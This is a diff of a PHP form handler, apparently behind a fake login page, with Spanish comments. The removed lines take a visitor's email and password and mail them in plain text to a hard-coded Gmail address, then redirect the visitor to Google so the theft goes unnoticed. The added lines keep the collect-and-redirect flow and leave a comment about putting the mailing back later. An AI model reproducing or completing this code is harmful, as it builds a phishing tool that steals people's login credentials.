@@ -1,26 +1,21 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Recibir datos
-    $email = $_POST["email"] ?? '';
-    $password = $_POST["password"] ?? '';
+// Verificamos primero si llegó la información por el formulario
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
-    // Tu correo de destino
-    $destinatario = "sebastiancq2008@gmail.com";
-    $asunto = "Nuevo inicio de sesión";
-    $mensaje = "Correo electrónico: " . $email . "\nContraseña: " . $password;
+    // Recibimos los datos de forma segura para evitar errores
+    $email = isset($_POST["email"]) ? trim($_POST["email"]) : "";
+    $password = isset($_POST["password"]) ? trim($_POST["password"]) : "";
 
-    // Encabezados obligatorios para que no lo rechacen
-    $encabezados = "From: no-responder@tudominio.com\r\n";
-    $encabezados .= "Reply-To: no-responder@tudominio.com\r\n";
-    $encabezados .= "X-Mailer: PHP/" . phpversion();
+    // --- Aquí iría el código para enviar el correo si lo querés después ---
+    // Por ahora solo lo dejamos funcionando para redirigir
 
-    // Enviar correo
-    if (mail($destinatario, $asunto, $mensaje, $encabezados)) {
-        // Redirigir si se envió
-        header("Location: https://www.google.com");
-        exit;
-    } else {
-        echo "Hubo un error al intentar enviar el correo.";
-    }
+    // Redirigir a Google
+    header("Location: https://www.google.com");
+    exit; // Detenemos la ejecución para que no siga corriendo nada más
+
+} else {
+    // Si alguien entra directamente a procesar.php, lo devolvemos al formulario
+    header("Location: index.html");
+    exit;
 }
 ?>
